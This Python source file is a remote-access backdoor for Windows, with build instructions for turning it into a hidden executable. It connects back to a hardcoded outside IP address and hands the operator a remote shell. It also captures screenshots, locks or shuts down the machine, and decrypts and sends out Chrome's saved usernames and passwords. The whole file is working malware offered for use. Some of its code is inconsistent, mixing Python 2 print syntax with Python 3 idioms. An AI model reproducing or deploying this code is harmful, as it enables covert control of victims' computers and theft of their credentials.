# ============================================================
# Backdoor developed by: Matheus Fontanetti Martins
# Compilling to exe: pyinstaller.exe backdoor.py --onefile --windowed --icon=icon.ico
# ============================================================

import socket
import os
import time
import platform
import psutil # dependency
import subprocess
from PIL import ImageGrab # dependency
import datetime
import base64
import ctypes
from Cryptodome.Cipher import AES # dependency
import sqlite3
from io import open
import json
import win32crypt
import shutil

class backdoor:
	try:
		TMP = os.environ["TEMP"]
		USER_PROFILE = os.environ["USERPROFILE"]
	except Exception:
		pass

	# start initial connection
	def __init__ (self, ip, port):
		while True:
			try:
				self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.con.connect((ip,port))
			except socket.error:
				wait_time = 5
				print "[-] Error while trying to connect, trying again in", wait_time, "seconds"
				
				time.sleep(wait_time)
			else:
				break

	# intial message
	def initial_message(self):
		message = "\n"
		message += "   |\   /|                              \n"
		message += "   | | | |    _      ___       __  __   \n"
		message += "   |  =  |   / \    / _/ |\// |   |  \  \n"
		message += "   | | | |  / = \  | |_  ||-  |== | = | \n"
		message += "   |/   \| /_/ \_\  \__\ |/\\\ |__ |__/ \n"
		message += "                                        \n"
		message += "[+] Connection recieved from: " + socket.gethostname() + "\n"
		message += "[+] Type 'h' to see all options\n"
		message += "============================="
		self.con.send(message + "\r\n")

		self.con.send("=> ")

	# display commands
	def display_comands(self):
		commands = "========== Help Menu =========\n"
		commands += "- h			=> get all commands                     \n"
		commands += "- exit			=> exit from the system                 \n"
		commands += "- user			=> get current user                     \n"
		commands += "- cd <path>		=> change to a determined path          \n"
		commands += "- message <message>	=> write a mesage to the user           \n"
		commands += "- screenshot		=> get a base64 screenshot of the system\n"
		commands += "- lock			=> lock the computer                    \n"
		commands += "- restart		=> restart the computer                 \n"
		commands += "- shutdown		=> shutdown the computer                \n"
		commands += "- getpasswd		=> get all chrome saved passwords       \n"
		commands += "============================="

		return commands
	
	# change working directory
	def change_working_directory(self, path):
		try:
			os.chdir(path)
			return "[+] Directory changed to: " + str(path)
		except Exception as err:
			return "[-] Error changing directory: " + str(err)
	
	# get the current user
	def get_current_user(self):
		try:
			user = os.environ.get('USERNAME')
			return "[+] Current user: " + str(user)
		except Exception as err:
			return "[-] Couldn't get the username: " + str(err)

	# get system info
	def get_system_info(self):
		info = ""
		info += "======== System Info ========\n"
		
		info += "Plataform: " + str(platform.system()) + "\n"
		info += "Released Date: " + str(platform.release()) + "\n"
		info += "Version: " + str(platform.version()) + "\n"
		info += "Architeture: " + str(platform.machine()) + "\n"
		info += "Hostname: " + str(socket.gethostname()) + "\n"
		info += "IP: " + str(socket.gethostbyname(socket.gethostname())) + "\n"
		info += "Processador: " + str(platform.processor()) + "\n"
		info += "RAM: " + str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB" + "\n"

		info += "============================="

		return info

	# screenshot
	def get_screenshot(self):
		try:
			current_time = datetime.datetime.now()
			screenshot = ImageGrab.grab()
			
			path = "{}/Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
			screenshot.save(path)

			data = self.read_file(path)
			self.delete_path(path)
            
			return data
		except Exception as err:
			return "[-] Error getting screenshot: " + str(err)

	# show message box popup
	def show_message_box(self, message):
		try:
			str_script = os.path.join(self.TMP, "m.vbs")
			with open(str_script, "w") as objVBS:
				objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"'.decode('utf-8'))
            		
			command = "cscript " + self.TMP + "/m.vbs "
			
			subprocess.Popen(command , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

			return "[+] Message sent: " + str(message)
		except Exception as err:
			return "[-] Couldn't send the message: " + str(err)

	# lock computer
	def lock_computer(self):
		try:
			ctypes.windll.user32.LockWorkStation()
			return "[+] Successfully locked the computer"
		except Exception as err:
			return "[-] Falied to lock the computer: " + str(err)

	#shutdown computer
	def shutdown_computer(self, type):
		try:
			command = "shutdown " + type + " -f -t 30"
			subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            
			self.con.close()
			sys.exit(0)
		except Exception as err:
			return "[-] Falied to shutdown the computer: " + str(err)

	# read file
	def read_file(self, path):
		try:
			with open(path, "rb") as file:
				return base64.b64encode(file.read()).decode()
		except Exception as err:
			return "[-] (Client) Error reading: " + str(err)

	# delete file/path
	def delete_path(self, path):
		try:
			if os.path.isdir(path):
				shutil.rmtree(path)
			elif os.path.isfile(path):
				os.remove(path)

				return "[+] Successfully deleted: " + path
		except Exception as err:
			return "[-] Error deleting: " + path + " | error: " + str(err)

	
	# ============= Funcoes para pegar senhas do chrome ==============
	
	# fetch encrypted passwords
	def fetch_encryption_key(self):
		local_computer_directory_path = os.path.join(
		os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        
		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
			local_state_data = f.read()
			local_state_data = json.loads(local_state_data)
    
			encryption_key = base64.b64decode(
        	local_state_data["os_crypt"]["encrypted_key"])
			encryption_key = encryption_key[5:]
        
			return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

	# decrypt passwords
	def decrypt_passwords(self, password, encryption_key):
		try:
			iv = password[3:15]
			password = password[15:]
                        
			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
			return cipher.decrypt(password)[:-16].decode()
		except:    
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				return "No Passwords"

	# get chrome passwords
	def get_passwords(self):
		final_ans = "====== Chrome Passwords ====="
    		
		key = self.fetch_encryption_key()
		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        
		filename = "ChromePasswords.db"
		shutil.copyfile(db_path, filename)        
		db = sqlite3.connect(filename)
		cursor = db.cursor()
                
		cursor.execute(
			"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
			"order by date_last_used")
        
		for row in cursor.fetchall():
			main_url = row[0]
			login_url = row[1]
			username = row[2]
			password = self.decrypt_passwords(row[3], key)
            
			if username or password:
				final_ans += "\n-----------------------------\n"                                   
				final_ans += "Main URL: " + main_url + "\n"
				final_ans += "Login URL: " + login_url + "\n"
				final_ans += "Username: " + username + "\n"
				final_ans += "Password: " + password + "\n"
				final_ans += "-----------------------------\n"
			else:
				continue

		final_ans += "============================="

		cursor.close()
		db.close()
        
		try:            
			os.remove(filename)
		except:
			pass

		return final_ans


	# loop shell function
	def run (self):

		self.initial_message()		

		while True:
			cmd = self.con.recv(1024)

			cmd_0 = str(cmd).strip().split(" ")[0]
			cmd_rest = " ".join(str(cmd).strip().split(" ")[1:])

			# help menu
			if cmd_0 == "h":
				ret = self.display_comands()
				self.con.send(ret + "\r\n")
			
			# exit backdoor
			elif cmd_0 == "exit":
				self.con.close()
				exit()

			# get the current user
			elif cmd_0 == "user":
				ret = self.get_current_user()
				self.con.send(ret + "\r\n")

			# change directory
			elif cmd_0 == "cd":
				ret = self.change_working_directory(cmd_rest)
				self.con.send(ret + "\r\n")

			# get system info
			elif cmd_0 == "info":
				ret = self.get_system_info()
				self.con.send(ret + "\r\n")

			# message box
			elif cmd_0 == "message":
				ret = self.show_message_box(cmd_rest)
				self.con.send(ret + "\r\n")

			# screnshot
			elif cmd_0 == "screenshot":
				ret = self.get_screenshot()
				self.con.send(ret + "\r\n")

			# lock computer
			elif cmd_0 == "lock":
				ret = self.lock_computer()
				self.con.send(ret + "\r\n")

			# restart computer
			elif cmd_0 == "restart":
				ret = self.shutdown_computer("-r")
				self.con.send(ret + "\r\n")

			# shutdown computer
			elif cmd_0 == "shutdown":
				ret = self.shutdown_computer("-s")
				self.con.send(ret + "\r\n")

			# get chrome passwords
			elif cmd_0 == "getpasswd":
				ret = self.get_passwords()
				self.con.send(ret + "\r\n")

			# execute system command
			else:
				for comando in os.popen(cmd):
					self.con.send(comando)
				
			self.con.send("=> ")
		

my_backdoor = backdoor("137.184.197.191", 666)
my_backdoor.run()
